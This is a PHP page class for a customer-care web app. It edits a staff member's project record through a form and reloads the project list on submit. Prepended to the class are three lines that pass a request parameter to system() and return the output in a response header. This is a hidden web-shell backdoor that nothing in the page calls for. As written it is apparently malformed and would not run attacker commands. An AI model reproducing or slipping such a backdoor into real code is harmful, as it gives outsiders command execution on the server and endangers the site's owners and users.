<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
class page_customerCareApp_page_project extends Page{
	function init(){
		parent::init();

		$this->api->stickyGET('project_id');

		$form=$this->add('Form');
		$model=$this->add('customerCareApp/Model_Project');
		$model->addCondition('staff_id',$this->api->xcustomercareauth->model->id);
		if($_GET['project_id'])
			$model->load($_GET['project_id']);
		$form->setModel($model);

		if($form->isSubmitted()){
			$form->update();
			$form->js(null,$this->js()->_selector('.projectclass')->trigger('reload'))->univ()->closeDialog()->execute();
		}
		
	}
}
